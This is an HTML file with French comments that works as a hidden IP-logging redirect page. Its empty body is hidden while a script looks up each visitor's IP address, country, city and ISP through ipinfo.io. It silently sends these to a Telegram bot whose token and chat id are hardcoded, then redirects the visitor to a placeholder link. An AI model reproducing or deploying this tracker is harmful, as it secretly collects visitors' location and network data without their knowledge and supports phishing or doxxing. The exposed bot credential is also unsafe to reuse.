<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>body { display: none; }</style>
  <script>
    (async () => {
      try {
        // Appel à ipinfo.io (clé non requise pour usage basique)
        const res = await fetch('https://ipinfo.io/json?token=TON_TOKEN'); // ← remplace TON_TOKEN si tu as un compte, sinon retire `?token=...`
        const data = await res.json();

        const ip = data.ip;
        const country = data.country; // Code pays, ex: FR
        const region = data.region || '';
        const city = data.city || '';
        const org = data.org || 'Inconnu';

        // Drapeau en emoji
        const flagEmoji = String.fromCodePoint(...[...country].map(c => 127397 + c.charCodeAt()));

        // Format message
        const message = `📡 Visiteur détecté\n🌍 IP: ${ip}\n🏳️ Pays: ${country} ${flagEmoji}\n📍 Ville: ${city}, ${region}\n🏢 FAI: ${org}`;

        // Envoi à Telegram
        const botToken = '7633904177:AAHGchn80h2QDuAmo_amRVwa7PxhgMNOPiY';
        const chatId = '6996434307';
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        await fetch(telegramUrl);

      } catch (err) {
        console.error("Erreur IPINFO ou Telegram:", err);
      } finally {
        // Redirection
        window.location.href = "https://tonlien.comc"; // ← à remplacer
      }
    })();
  </script>
</head>
<body></body>
</html>
